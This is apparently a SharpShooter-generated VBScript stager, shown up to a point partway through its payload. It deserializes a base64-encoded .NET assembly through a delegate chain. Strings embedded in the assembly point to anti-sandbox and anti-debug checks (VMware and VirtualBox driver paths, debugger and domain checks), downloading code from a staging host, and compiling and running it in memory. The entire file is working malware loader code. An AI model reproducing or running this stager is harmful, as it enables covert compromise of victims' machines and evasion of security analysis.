Sub DebugPrint(s)
End Sub

Sub SetVersion
Dim shell
Set shell = CreateObject("WScript.Shell")
shell.Environment("Process").Item("COMPLUS_Version") = "v4.0.30319"
End Sub

Function Base64ToStream(b)
  Dim enc, length, ba, transform, ms
  Set enc = CreateObject("System.Text.ASCIIEncoding")
  length = enc.GetByteCount_2(b)
  Set transform = CreateObject("System.Security.Cryptography.FromBase64Transform")
  Set ms = CreateObject("System.IO.MemoryStream")
  ms.Write transform.TransformFinalBlock(enc.GetBytes_4(b), 0, length), 0, ((length / 4) * 3)
  ms.Position = 0
  Set Base64ToStream = ms
End Function

Sub Run
Dim s, entry_class
serialized_obj = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy"
serialized_obj = serialized_obj & "AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph"
serialized_obj = serialized_obj & "dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk"
serialized_obj = serialized_obj & "ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD"
serialized_obj = serialized_obj & "AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl"
serialized_obj = serialized_obj & "RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU"
serialized_obj = serialized_obj & "eXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNl"
serialized_obj = serialized_obj & "cmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90"
serialized_obj = serialized_obj & "aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAu"
serialized_obj = serialized_obj & "MCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAH"
serialized_obj = serialized_obj & "dGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAA"
serialized_obj = serialized_obj & "ACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQw"
serialized_obj = serialized_obj & "B21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVu"
serialized_obj = serialized_obj & "dHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAA"
serialized_obj = serialized_obj & "CQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9u"
serialized_obj = serialized_obj & "SG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0dXJlCk1lbWJlclR5"
serialized_obj = serialized_obj & "cGUQR2VuZXJpY0FyZ3VtZW50cwEBAQEAAwgNU3lzdGVtLlR5cGVbXQkKAAAACQYAAAAJCQAAAAYR"
serialized_obj = serialized_obj & "AAAALFN5c3RlbS5PYmplY3QgRHluYW1pY0ludm9rZShTeXN0ZW0uT2JqZWN0W10pCAAAAAoBCwAA"
serialized_obj = serialized_obj & "AAIAAAAGEgAAACBTeXN0ZW0uWG1sLlNjaGVtYS5YbWxWYWx1ZUdldHRlcgYTAAAATVN5c3RlbS5Y"
serialized_obj = serialized_obj & "bWwsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdh"
serialized_obj = serialized_obj & "NWM1NjE5MzRlMDg5BhQAAAAHdGFyZ2V0MAkGAAAABhYAAAAaU3lzdGVtLlJlZmxlY3Rpb24uQXNz"
serialized_obj = serialized_obj & "ZW1ibHkGFwAAAARMb2FkCg8MAAAAADIAAAJNWpAAAwAAAAQAAAD//wAAuAAAAAAAAABAAAAAAAAA"
serialized_obj = serialized_obj & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAADh+6DgC0Cc0huAFMzSFUaGlzIHByb2dy"
serialized_obj = serialized_obj & "YW0gY2Fubm90IGJlIHJ1biBpbiBET1MgbW9kZS4NDQokAAAAAAAAAFBFAABkhgIAHIvsYQAAAAAA"
serialized_obj = serialized_obj & "AAAA8AAiIAsCMAAAKgAAAAYAAAAAAAAAAAAAACAAAAAAAIABAAAAACAAAAACAAAEAAAAAAAAAAQA"
serialized_obj = serialized_obj & "AAAAAAAAAIAAAAACAAAAAAAAAwBAhQAAQAAAAAAAAEAAAAAAAAAAABAAAAAAAAAgAAAAAAAAAAAA"
serialized_obj = serialized_obj & "ABAAAAAAAAAAAAAAAAAAAAAAAAAAAGAAAFQEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAISAAA"
serialized_obj = serialized_obj & "HAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"
serialized_obj = serialized_obj & "AAAAACAAAEgAAAAAAAAAAAAAAC50ZXh0AAAAQCkAAAAgAAAAKgAAAAIAAAAAAAAAAAAAAAAAACAA"
serialized_obj = serialized_obj & "AGAucnNyYwAAAFQEAAAAYAAAAAYAAAAsAAAAAAAAAAAAAAAAAABAAABAAAAAAAAAAAAAAAAAAAAA"
serialized_obj = serialized_obj & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEgAAAACAAUAdCcAAJQgAAABAAAAAAAAAAAAAAAAAAAA"
serialized_obj = serialized_obj & "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAF4DKA8AAApvEAAAChcoEQAA"
serialized_obj = serialized_obj & "CiwCFyoWKm5yAQAAcCgPAAAKbxAAAAoXKBEAAAosAhYqFyoTMAQAUgEAAAEAABFzEgAACgofII0h"
serialized_obj = serialized_obj & "AAABJRZyAwAAcKIlF3JVAABwoiUYcqUAAHCiJRly8wAAcKIlGnJFAQBwoiUbcpUBAHCiJRxy4QEA"
serialized_obj = serialized_obj & "cKIlHXI5AgBwoiUeco0CAHCiJR8Jct0CAHCiJR8KcjcDAHCiJR8LcocDAHCiJR8Mct8DAHCiJR8N"
serialized_obj = serialized_obj & "cjcEAHCiJR8OcpcEAHCiJR8PcucEAHCiJR8Qcj0FAHCiJR8RcpMFAHCiJR8ScuMFAHCiJR8TcjkG"
serialized_obj = serialized_obj & "AHCiJR8Ucn0GAHCiJR8VcsEGAHCiJR8WcgcHAHCiJR8XckkHAHCiJR8YcpsHAHCiJR8ZcukHAHCi"
serialized_obj = serialized_obj & "JR8acjsIAHCiJR8bcpMIAHCiJR8ccuMIAHCiJR8dckEJAHCiJR8ecosJAHCiJR8fcs8JAHCiCxYM"
serialized_obj = serialized_obj & "KxcHCJoNCSgTAAAKLAcGCW8UAAAKCBdYDAgHjmky4wZvFQAACi0CFioXKgAAEzAGAMcAAAACAAAR"
serialized_obj = serialized_obj & "cxIAAAoKG40hAAABJRZyGQoAcKIlF3InCgBwoiUYcjUKAHCiJRlyQwoAcKIlGnJRCgBwogsoFgAA"
serialized_obj = serialized_obj & "CgwWDSt2CAmaEwQHEwUWEwYrXREFEQaaEwcRBG8XAAAKbxgAAApvGQAAChEHbxkAAApvGgAACiwx"
serialized_obj = serialized_obj & "BhEEbxcAAApvGAAACnJfCgBwcmkKAHAoGwAACheNJgAAASUWHzqdbxwAAApvFAAAChEGF1gTBhEG"
serialized_obj = serialized_obj & "EQWOaTKbCRdYDQkIjmkyhAZvFQAACi0CFioXKi4oHQAACiwCFyoWKh4CKB4AAAoqABMwAgBtAAAA"
serialized_obj = serialized_obj & "AwAAEXMGAAAGCgNFBQAAAAEAAAARAAAAIAAAAC8AAAA+AAAAKgYEbwEAAAYtQhcoHwAACioGbwIA"
serialized_obj = serialized_obj & "AAYtMxcoHwAACioGbwMAAAYsJBcoHwAACioGbwQAAAYsFRcoHwAACioGbwUAAAYsBhcoHwAACioA"
serialized_obj = serialized_obj & "AAAbMAYARAAAAAQAABFzBwAABgoDcnEKAHAoIAAAChdvIQAACgsOBBcuBw4EGC4QKxoGBwQFFw4F"
serialized_obj = serialized_obj & "bw8AAAYrDAYHBAUWDgVvDwAABt4DJt4AKgEQAAAAABgAKEAAAxMAAAETMAQANQAAAAUAABFzIgAA"
serialized_obj = serialized_obj & "CiVvIwAACnJ1CgBwcosKAHBvJAAACiUXbyUAAAoDbyYAAAooJwAACgoCBigOAAAGKgAAABswBADG"
serialized_obj = serialized_obj & "AAAABgAAEXIBAABwCnIYCwBwAygoAAAKDHJWCwBwDXJ2CwBwcykAAAolcogLAHADKCgAAApvKgAA"
serialized_obj = serialized_obj & "CiUXbysAAAolF28sAAAKJRZvLQAACiUXby4AAAolF28vAAAKKDAAAAoTBREFbzEAAApvMgAACgve"
serialized_obj = serialized_obj & "DBEFLAcRBW8zAAAK3AcIFyg0AAAKEwQRBG81AAAKLCoRBG82AAAKFm83AAAKbzgAAAoJFyg0AAAK"
serialized_obj = serialized_obj & "bzYAAAoWbzcAAApvOAAACgoGcswLAHB+OQAACm86AAAKKgAAARAAAAIAXQAPbAAMAAAAABMwBQB0"
serialized_obj = serialized_obj & "AAAABwAAEQJy0AsAcAMoOwAACigLAAAGCgYfEQZy1gsAcB8RbzwAAAofEVlvPQAACig+AAAKC3IB"
serialized_obj = serialized_obj & "AABwDBcTBCslCAISBCg/AAAKctoLAHADKEAAAAooCwAABig7AAAKDBEEF1gTBBEEBzHWCCgnAAAK"
serialized_obj = serialized_obj & "DQIJKA4AAAYqEzAEACYAAAAIAAARIAAQAACNNwAAAQorCQQGFgdvQQAACgMGFgaOaW9CAAAKJQst"
serialized_obj = serialized_obj & "6CoAABswAwBSAAAACQAAEQNzQwAACgpzRAAACgsGFnNFAAAKDAIIBygNAAAG3goILAYIbzMAAArc"
serialized_obj = serialized_obj & "KEYAAAoHb0cAAApvSAAACg3eFAcsBgdvMwAACtwGLAYGbzMAAArcCSoAAAEoAAACABUACh8ACgAA"
serialized_obj = serialized_obj & "AAACAA0ALzwACgAAAAACAAcAP0YACgAAAAAbMAYAUQEAAAoAABFzBgAABiZzSQAACiVy3gsAcHL+"
serialized_obj = serialized_obj & "CwBwb0oAAApzSwAACgpzTAAACgsDEwUWEwYrGxEFEQaaEwcHb00AAAoRB29OAAAKJhEGF1gTBhEG"
serialized_obj = serialized_obj & "EQWOaTLdBxZvTwAACgcXb1AAAAoHcggMAHBvUQAACh8cKFIAAApyNAwAcChTAAAKDAcIFnNUAAAK"
serialized_obj = serialized_obj & "b1UAAAoOBCwLAg4FKAoAAAYNKwkCDgUoDAAABg0GBxeNIQAAASUWCaJvVgAAChMEEQRvVwAACm9Y"
serialized_obj = serialized_obj & "AAAKLHJzWQAAChMIEQRvVwAACm9aAAAKEwkrLhEJb1sAAAp0HgAAARMKEQhyPgwAcBEKb1wAAAoR"
serialized_obj = serialized_obj & "Cm9dAAAKKF4AAApvXwAACiYRCW9gAAAKLcneFREJdR8AAAETCxELLAcRC28zAAAK3BEIbxgAAApz"
serialized_obj = serialized_obj & "YQAACnoRBG9iAAAKBG9jAAAKBW9kAAAKFBRvZQAACiYqAAAAARAAAAIA2AA7EwEVAAAAAEJTSkIB"
serialized_obj = serialized_obj & "AAEAAAAAAAwAAAB2NC4wLjMwMzE5AAAAAAUAbAAAAHgGAAAjfgAA5AYAAOAJAAAjU3RyaW5ncwAA"
serialized_obj = serialized_obj & "AADEEAAAYAwAACNVUwAkHQAAEAAAACNHVUlEAAAANB0AAGADAAAjQmxvYgAAAAAAAAACAAABRxUC"
serialized_obj = serialized_obj & "CAkAAAAA+gEzABYAAAEAAABHAAAAAwAAAA8AAAATAAAAZQAAAA8AAAAKAAAAAgAAAAEAAAACAAAA"
serialized_obj = serialized_obj & "AAAkBAEAAAAAAAYA3ALcBgYASQPcBgYAEAKSBg8A/AYAAAYAOAKtBAYAvwKtBAYAoAKtBAYAMAOt"
serialized_obj = serialized_obj & "BAYA/AKtBAYAFQOtBAYATwKtBAYAJAK9BgYAAgK9BgYAgwKtBAYAagKvAwYAmQhiBAYAAQBiAAoA"
serialized_obj = serialized_obj & "7gCPBAYAQwViBAoACgR9BwoAMgiSBgYAUgQuAAYATAQuAAoAQQR5BAoAzgWKBQoA+gcWBgoAZggW"
serialized_obj = serialized_obj & "BgYA8QVSCQYAawacBwoAXQYWBgYAQgFiBAoAJwePBAYA9QNiBAYATQViBAYAZQEuAAoAPQiPBAoA"
serialized_obj = serialized_obj & "fwl9BwYAoQViBAYADQaSBgYAwAhiBAYAwwdiBAoAtgigCAoABwWgCAoA0gSzAAYA+QhiBAoAcwWS"
serialized_obj = serialized_obj & "BgoAegGSBgYAtgUuAAYAwwUuAAoA1gd9BwoAmwV9BwoA9wR9BwoAwAF9BwYACABiBAYAewNiBAoA"
serialized_obj = serialized_obj & "KwF5BAYApgNSCQYADwBiAAYADgBiAAoA5gSzAKMA/wUAAAYAGQQuAAoAvwQWBgoA4QUWBgoAGwUW"
serialized_obj = serialized_obj & "BgYA0wGcBwYAMwViBAYAugmtBAYAuwFiBAYAaAWtBAYAyAGtBAAAAAAlAAAAAAABAAEAAAAQAOIB"
serialized_obj = serialized_obj & "AABBAAEAAQABABAALgYAAEEAAQAHAEggAAAAAIYAaQRuAAEAYCAAAAAAhgCkAPAAAgB8IAAAAACG"
serialized_obj = serialized_obj & "AE0I8AACANwhAAAAAIYAWQDwAAIAryIAAAAAhgCKAPAAAgC7IgAAAACGGIUGBgACALsiAAAAAIYY"
serialized_obj = serialized_obj & "hQYGAAIAxCIAAAAAhgDiAQQCAgBAIwAAAACGAF4FCgIEAKAjAAAAAIEASQC1AAkA5CMAAAAAgQA/"
serialized_obj = serialized_obj & "ALUACgDIJAAAAACBADgAtQALAEglAAAAAIEAYQUTAgwAfCUAAAAAgQCEBWQBDgAEJgAAAACBAO0I"
serialized_obj = serialized_obj & "GwIPAAAAAQByBAAAAQAeBAAAAgAGBAAAAQCLBgAAAgAHAQAAAwDYCAAABACKAwAABQAGCQAAAQA9"
serialized_obj = serialized_obj & "BAAAAQCcAQAAAQByBAAAAQB9AAAAAgABCQAAAQBIBwAAAQBOBwAAAgDYCAAAAwDnAAAABACUAwAA"
serialized_obj = serialized_obj & "BQAQCQkAhQYBABEAhQYGABkAhQYKACkAhQYQADEAhQYQADkAhQYQAEEAhQYQAEkAhQYQAFEAhQYQ"
serialized_obj = serialized_obj & "AFkAhQYQAGEAhQYVAGkAhQYQAHEAhQYQAHkAhQYQAAEBJAcaAAEBjQEgAAkBbQckAAwAhQYGABkB"
serialized_obj = serialized_obj & "hAg/AAwAhgBEAAwA4whKAJEApQZiAJEAOghoAIEA6QMgAAkBOwYgAAkBdAduACkB/wBzAAkB0gB6"
serialized_obj = serialized_obj & "ADkBlQCAAIEAhQYGAEEBsQiJAAkBjQmVAAkBqwiaAFEBhQYGAFEB7gepAGEBhgCvAFEBUwcVAFEB"
serialized_obj = serialized_obj & "2gO1AGkByQO6AAkBkgjLAHEBhQYQAHEBdggQAHEBLgkVAHEBQwYVAHEBZwMVAHEBagHRAHEBbAkV"
serialized_obj = serialized_obj & "AKkA8wjYAKkAGwngAIkB2gAgAPkA7gEGACkBCgTmAJkBJgjwAKEA4wf0AKEBWQT6AKkBgAMgAAkB"
serialized_obj = serialized_obj & "2AkBAQkB/wAEAQkBiwgTAQkBngMZAQkB/AMfAbEB9gElAbEB6QMgAAkBiwhzALEA/AEwAbEAgQA4"
serialized_obj = serialized_obj & "AbkAhQZKAbkAhQYGAMEAhQZQAckBHABZAbkAhQlfAckB8gNkARQAhQYGABQAhgCJAckAhQaRAdEA"
serialized_obj = serialized_obj & "hQYGANEACwecAeEBhgCiAdEATgEVANEAwwkVANEArwcQAEEBEASnAfEBsAETAfkBhQauAdEAOge0"
serialized_obj = serialized_obj & "AQECEQG7AdkADQjEAQkCGAjwAOEAhQYGABECdwbKAekAzAjPAfEApgUgAPEAXgkgAAkBkgjTAeEA"
serialized_obj = serialized_obj & "pQHaAekASQnwABkChQYQANkAmQngASECuAHmASkC5ADtATkCOwH0AS4ACwAlAi4AEwAuAi4AGwBN"
serialized_obj = serialized_obj & "Ai4AIwBWAi4AKwBwAi4AMwCTAi4AOwCZAi4AQwBWAi4ASwCxAi4AUwCTAi4AWwCTAi4AYwDZAi4A"
serialized_obj = serialized_obj & "awADAy4AcwAQA2MAWwBYAy0ATgCEAI4ApADAAAoBKgFAAWoBOQCBAQSAAAABAAAAAAAAAAAAAAAA"
serialized_obj = serialized_obj & "AK4JAAAEAAAAAAAAAAAAAAD7AVAAAAAAAAQAAAAAAAAAAAAAAPsBYgQAAAAAAAAAAABMaXN0YDEA"
serialized_obj = serialized_obj & "SW50MzIASURpY3Rpb25hcnlgMgBnZXRfVVRGOAA8TW9kdWxlPgBTeXN0ZW0uSU8AQWltRE5TAExv"
serialized_obj = serialized_obj & "b2t1cEROUwBBaW1XZWIAbXNjb3JsaWIAaXNCYWRNYWMAU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVy"
serialized_obj = serialized_obj & "aWMAc3JjAFJlYWQAQWRkAGlzRGVidWdnZWQAZ2V0X0lzQXR0YWNoZWQAaXNEb21haW5Kb2luZWQA"
serialized_obj = serialized_obj & "U3lzdGVtLkNvbGxlY3Rpb25zLlNwZWNpYWxpemVkAFRyaW1FbmQAUmVhZFRvRW5kAEdldE1ldGhv"
serialized_obj = serialized_obj & "ZABOZXR3b3JrSW50ZXJmYWNlAFJlcGxhY2UATmFtZVNwYWNlAENvbXBpbGVBc3NlbWJseUZyb21T"
serialized_obj = serialized_obj & "b3VyY2UAQ29tcHJlc3Npb25Nb2RlAEludm9rZQBJRGlzcG9zYWJsZQBzZXRfR2VuZXJhdGVFeGVj"
serialized_obj = serialized_obj & "dXRhYmxlAEZpbGUAc2V0X1dpbmRvd1N0eWxlAFByb2Nlc3NXaW5kb3dTdHlsZQBnZXRfRG9tYWlu"
serialized_obj = serialized_obj & "TmFtZQBob3N0bmFtZQBBcHBlbmRMaW5lAENvbWJpbmUAR2V0VHlwZQBDYXB0dXJlAE1ldGhvZEJh"
serialized_obj = serialized_obj & "c2UAQ29sbGVjdGlvbkJhc2UAQ2hlY2tQbGVhc2UARGlzcG9zZQBQYXJzZQBXcml0ZQBHdWlkQXR0"
serialized_obj = serialized_obj & "cmlidXRlAERlYnVnZ2FibGVBdHRyaWJ1dGUAQ29tVmlzaWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRp"
serialized_obj = serialized_obj & "dGxlQXR0cmlidXRlAEFzc2VtYmx5VHJhZGVtYXJrQXR0cmlidXRlAFRhcmdldEZyYW1ld29ya0F0"
serialized_obj = serialized_obj & "dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5Q29uZmlndXJhdGlv"
serialized_obj = serialized_obj & "bkF0dHJpYnV0ZQBBc3NlbWJseURlc2NyaXB0aW9uQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhh"
serialized_obj = serialized_obj & "dGlvbnNBdHRyaWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0"
serialized_obj = serialized_obj & "QXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0"
serialized_obj = serialized_obj & "dHJpYnV0ZQBzZXRfVXNlU2hlbGxFeGVjdXRlAEJ5dGUAZ2V0X1ZhbHVlAFRlY2huaXF1ZQB0ZWNo"
serialized_obj = serialized_obj & "bmlxdWUASW5kZXhPZgBFbmNvZGluZwBTeXN0ZW0uUnVudGltZS5WZXJzaW9uaW5nAEZyb21CYXNl"
serialized_obj = serialized_obj & "NjRTdHJpbmcARG93bmxvYWRTdHJpbmcAVG9TdHJpbmcAR2V0U3RyaW5nAFN1YnN0cmluZwBhcmcA"
serialized_obj = serialized_obj & "TWF0Y2gAR2V0Rm9sZGVyUGF0aABjaGVjawBTaGFycFNob290ZXJBc3NlbWJseS5kbGwAdXJsAEda"
serialized_obj = serialized_obj & "aXBTdHJlYW0ATWVtb3J5U3RyZWFtAGdldF9JdGVtAFN5c3RlbQBpc0RvbWFpbgBkb21haW4AU3lz"
serialized_obj = serialized_obj & "dGVtLklPLkNvbXByZXNzaW9uAFN5c3RlbS5OZXQuTmV0d29ya0luZm9ybWF0aW9uAFN5c3RlbS5S"
serialized_obj = serialized_obj & "ZWZsZWN0aW9uAFRlbXBGaWxlQ29sbGVjdGlvbgBOYW1lVmFsdWVDb2xsZWN0aW9uAFN0cmluZ0Nv"
serialized_obj = serialized_obj & "bGxlY3Rpb24AR3JvdXBDb2xsZWN0aW9uAFdlYkhlYWRlckNvbGxlY3Rpb24AQ29tcGlsZXJFcnJv"
serialized_obj = serialized_obj & "ckNvbGxlY3Rpb24ASW52YWxpZE9wZXJhdGlvbkV4Y2VwdGlvbgBTdHJpbmdDb21wYXJpc29uAEdv"
serialized_obj = serialized_obj & "AENvcHlUbwBNZXRob2RJbmZvAFByb2Nlc3NTdGFydEluZm8AVW56aXAATWljcm9zb2Z0LkNTaGFy"
serialized_obj = serialized_obj & "cABHcm91cABDaGFyAGdldF9FcnJvck51bWJlcgBTdHJlYW1SZWFkZXIAVGV4dFJlYWRlcgBDU2hh"
serialized_obj = serialized_obj & "cnBDb2RlUHJvdmlkZXIAQ29kZURvbVByb3ZpZGVyAFN0cmluZ0J1aWxkZXIAU3BlY2lhbEZvbGRl"
serialized_obj = serialized_obj & "cgBEZWJ1Z2dlcgBTeXN0ZW0uQ29kZURvbS5Db21waWxlcgBTaGFycFNob290ZXIAVG9Mb3dlcgBz"
serialized_obj = serialized_obj & "ZXRfUmVkaXJlY3RTdGFuZGFyZEVycm9yAENvbXBpbGVyRXJyb3IASUVudW1lcmF0b3IAR2V0RW51"
serialized_obj = serialized_obj & "bWVyYXRvcgAuY3RvcgBSZWZTdHIAU3lzdGVtLkRpYWdub3N0aWNzAEdldEFsbE5ldHdvcmtJbnRl"
serialized_obj = serialized_obj & "cmZhY2VzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21w"
serialized_obj = serialized_obj & "aWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAGdldF9SZWZlcmVuY2VkQXNzZW1ibGllcwBHZXRJ"
serialized_obj = serialized_obj & "UEdsb2JhbFByb3BlcnRpZXMAc2V0X1RlbXBGaWxlcwBieXRlcwByZWZzAHNldF9Vc2VEZWZhdWx0"
serialized_obj = serialized_obj & "Q3JlZGVudGlhbHMARXF1YWxzAENvbnRhaW5zAFN5c3RlbS5UZXh0LlJlZ3VsYXJFeHByZXNzaW9u"
serialized_obj = serialized_obj & "cwBTeXN0ZW0uQ29sbGVjdGlvbnMAc2V0X0NvbXBpbGVyT3B0aW9ucwBTdHJpbmdTcGxpdE9wdGlv"
serialized_obj = serialized_obj & "bnMAUmVnZXhPcHRpb25zAGdldF9Hcm91cHMAZ2V0X0hlYWRlcnMAQ29tcGlsZXJQYXJhbWV0ZXJz"
serialized_obj = serialized_obj & "AGdldF9FcnJvcnMAZ2V0X0hhc0Vycm9ycwBnZXRfU3VjY2VzcwBQcm9jZXNzAEdldFBoeXNpY2Fs"
serialized_obj = serialized_obj & "QWRkcmVzcwBjb250YWluc1NhbmRib3hBcnRpZmFjdHMAQ29tcGlsZXJSZXN1bHRzAHNldF9Bcmd1"
serialized_obj = serialized_obj & "bWVudHMARXhpc3RzAENvbmNhdABGb3JtYXQAT2JqZWN0AFN5c3RlbS5OZXQAU3BsaXQARXhpdABX"
serialized_obj = serialized_obj & "ZWJDbGllbnQARW52aXJvbm1lbnQAZ2V0X0N1cnJlbnQARW50cnlQb2ludABnZXRfQ291bnQAU2hv"
serialized_obj = serialized_obj & "b3QAU3RhcnQAQ29udmVydABkZXN0AFN0YWdlSG9zdABzdGFnZXJob3N0AGdldF9TdGFuZGFyZE91"
serialized_obj = serialized_obj & "dHB1dABzZXRfUmVkaXJlY3RTdGFuZGFyZE91dHB1dABNb3ZlTmV4dABTeXN0ZW0uVGV4dABnZXRf"
serialized_obj = serialized_obj & "RXJyb3JUZXh0AHNldF9DcmVhdGVOb1dpbmRvdwBSZWdleABUb0FycmF5AFRvQ2hhckFycmF5AGdl"
serialized_obj = serialized_obj & "dF9Db21waWxlZEFzc2VtYmx5AFNoYXJwU2hvb3RlckFzc2VtYmx5AHNldF9HZW5lcmF0ZUluTWVt"
serialized_obj = serialized_obj & "b3J5AEVtcHR5AAAAAAEAUUMAOgBcAHcAaQBuAGQAbwB3AHMAXABTAHkAcwBuAGEAdABpAHYAZQBc"
serialized_obj = serialized_obj & "AEQAcgBpAHYAZQByAHMAXABWAG0AbQBvAHUAcwBlAC4AcwB5AHMAAE9DADoAXAB3AGkAbgBkAG8A"
serialized_obj = serialized_obj & "dwBzAFwAUwB5AHMAbgBhAHQAaQB2AGUAXABEAHIAaQB2AGUAcgBzAFwAdgBtADMAZABnAGwALgBk"
serialized_obj = serialized_obj & "AGwAbAAATUMAOgBcAHcAaQBuAGQAbwB3AHMAXABTAHkAcwBuAGEAdABpAHYAZQBcAEQAcgBpAHYA"
serialized_obj = serialized_obj & "ZQByAHMAXAB2AG0AZAB1AG0ALgBkAGwAbAAAUUMAOgBcAHcAaQBuAGQAbwB3AHMAXABTAHkAcwBu"
serialized_obj = serialized_obj & "AGEAdABpAHYAZQBcAEQAcgBpAHYAZQByAHMAXAB2AG0AMwBkAHYAZQByAC4AZABsAGwAAE9DADoA"
serialized_obj = serialized_obj & "XAB3AGkAbgBkAG8AdwBzAFwAUwB5AHMAbgBhAHQAaQB2AGUAXABEAHIAaQB2AGUAcgBzAFwAdgBt"
serialized_obj = serialized_obj & "AHQAcgBhAHkALgBkAGwAbAAAS0MAOgBcAHcAaQBuAGQAbwB3AHMAXABTAHkAcwBuAGEAdABpAHYA"
serialized_obj = serialized_obj & "ZQBcAEQAcgBpAHYAZQByAHMAXAB2AG0AYwBpAC4AcwB5AHMAAFdDADoAXAB3AGkAbgBkAG8AdwBz"
serialized_obj = serialized_obj & "AFwAUwB5AHMAbgBhAHQAaQB2AGUAXABEAHIAaQB2AGUAcgBzAFwAdgBtAHUAcwBiAG0AbwB1AHMA"
serialized_obj = serialized_obj & "ZQAuAHMAeQBzAABTQwA6AFwAdwBpAG4AZABvAHcAcwBcAFMAeQBzAG4AYQB0AGkAdgBlAFwARABy"
serialized_obj = serialized_obj & "AGkAdgBlAHIAcwBcAHYAbQB4AF8AcwB2AGcAYQAuAHMAeQBzAABPQwA6AFwAdwBpAG4AZABvAHcA"
serialized_obj = serialized_obj & "cwBcAFMAeQBzAG4AYQB0AGkAdgBlAFwARAByAGkAdgBlAHIAcwBcAHYAbQB4AG4AZQB0AC4AcwB5"
serialized_obj = serialized_obj & "AHMAAFlDADoAXAB3AGkAbgBkAG8AdwBzAFwAUwB5AHMAbgBhAHQAaQB2AGUAXABEAHIAaQB2AGUA"
serialized_obj = serialized_obj & "cgBzAFwAVgBNAFQAbwBvAGwAcwBIAG8AbwBrAC4AZABsAGwAAE9DADoAXAB3AGkAbgBkAG8AdwBz"
serialized_obj = serialized_obj & "AFwAUwB5AHMAbgBhAHQAaQB2AGUAXABEAHIAaQB2AGUAcgBzAFwAdgBtAGgAZwBmAHMALgBkAGwA"
serialized_obj = serialized_obj & "bAAAV0MAOgBcAHcAaQBuAGQAbwB3AHMAXABTAHkAcwBuAGEAdABpAHYAZQBcAEQAcgBpAHYAZQBy"
serialized_obj = serialized_obj & "AHMAXAB2AG0AbQBvAHUAcwBlAHYAZQByAC4AZABsAGwAAFdDADoAXAB3AGkAbgBkAG8AdwBzAFwA"
serialized_obj = serialized_obj & "UwB5AHMAbgBhAHQAaQB2AGUAXABEAHIAaQB2AGUAcgBzAFwAdgBtAEcAdQBlAHMAdABMAGkAYgAu"
serialized_obj = serialized_obj & "AGQAbABsAABfQwA6AFwAdwBpAG4AZABvAHcAcwBcAFMAeQBzAG4AYQB0AGkAdgBlAFwARAByAGkA"
serialized_obj = serialized_obj & "dgBlAHIAcwBcAFYAbQBHAHUAZQBzAHQATABpAGIASgBhAHYAYQAuAGQAbABsAABPQwA6AFwAdwBp"
serialized_obj = serialized_obj & "AG4AZABvAHcAcwBcAFMAeQBzAG4AYQB0AGkAdgBlAFwARAByAGkAdgBlAHIAcwBcAHYAbQBzAGMA"
serialized_obj = serialized_obj & "cwBpAC4AcwB5AHMAAFVDADoAXAB3AGkAbgBkAG8AdwBzAFwAUwB5AHMAbgBhAHQAaQB2AGUAXABE"
serialized_obj = serialized_obj & "AHIAaQB2AGUAcgBzAFwAVgBCAG8AeABNAG8AdQBzAGUALgBzAHkAcwAAVUMAOgBcAHcAaQBuAGQA"
